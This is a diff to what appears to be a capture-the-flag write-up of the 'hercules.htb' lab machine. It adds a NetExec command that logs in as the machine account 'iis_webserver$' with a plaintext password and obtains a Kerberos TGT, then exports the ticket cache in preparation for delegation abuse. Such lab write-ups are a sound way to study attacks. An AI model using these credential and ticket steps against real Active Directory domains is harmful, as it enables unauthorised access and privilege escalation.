@@ -1568,7 +1568,25 @@ iis_webserver$  Person       Resource-Based Constrained  DC$                 No
 DC$             Computer     Unconstrained               N/A                 Yes 
 ```
 
-Looks like there is RBCD
+Looks like there is RBCD!
+
+```python
+nxc smb dc.hercules.htb -u 'iis_webserver$' -p 'Password123!' -k --generate-tgt iiswebserver
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] hercules.htb\iis_webserver$:Password123! 
+SMB         dc.hercules.htb 445    dc               [+] TGT saved to: iiswebserver.ccache
+SMB         dc.hercules.htb 445    dc               [+] Run the following command to use the TGT: export KRB5CCNAME=iiswebserver.ccache
+```
+
+Ill first get a TGT as this user
+
+```python
+export KRB5CCNAME=iiswebserver.ccache
+```
+
+Then ill export it!
+
+
 
 
 
